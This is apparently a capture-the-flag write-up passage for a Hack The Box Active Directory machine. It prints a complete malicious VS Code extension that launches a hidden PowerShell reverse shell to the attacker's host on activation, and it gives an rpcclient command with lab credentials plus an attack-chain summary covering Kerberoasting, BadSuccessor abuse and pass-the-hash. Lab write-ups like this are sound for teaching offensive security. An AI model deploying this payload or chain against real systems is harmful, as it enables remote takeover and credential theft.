Creating Malicious VSIX Extension

6.2 Create extension/out/extension.js

const { exec } = require('child_process');

function activate(context) {
  // Replace <kali vpn> with your Kali tun0 IP
  const cmd = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient(\'<kali vpn>\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\'PS \'+(pwd).Path+\'> \';$nb=[text.encoding]::ASCII.GetBytes($r2);$s.Write($nb,0,$nb.Length);$s.Flush()};$c.Close()"';
  exec(cmd);
}

function deactivate() {}

Why this matteredBackups are a completely separate attack surface from the live host — a memory snapshot taken for legitimate DR purposes carries the exact same secrets an attacker would want from a live LSASS dump, just easier to exfiltrate.

Why root.txt Was on max.palmer's Desktop

max.palmer is a Domain Administrator, confirmed via RPC:

rpcclient -U 'checkpoint.htb\alex.turner%Checkpoint2024!' <TARGET_IP> -c 'queryusergroups 0x13ed'

HTB often places root flags on the desktop of a Domain Admin user rather than the built-in Administrator account. max.palmer was the most recently active Domain Admin (logon_count: 267, password set May 26, 2026).

Complete Attack Chain Summary

  1. Enumeration → discovered DevDrop share + deleted mark.davies account
  2. alex.turner → CREATE_CHILD permission on OU=Employees → restored mark.davies
  3. mark.davies → Kerberoast + password pattern guess → write access to DevDrop
  4. Malicious VSIX uploaded to DevDrop → executed by ryan.brooks → reverse shell
  5. ryan.brooks → TGT extracted → BadSuccessor (DMSA) attack → svc_deploy NT hash
  6. svc_deploy → WinRM access via BackupAccess group → VMBackups share
  7. Memory dump extracted → registry hives dumped via Volatility3 → Administrator NT hash
  8. Pass-the-Hash → Administrator access → root flag on max.palmer's desktop (Domain Admin)
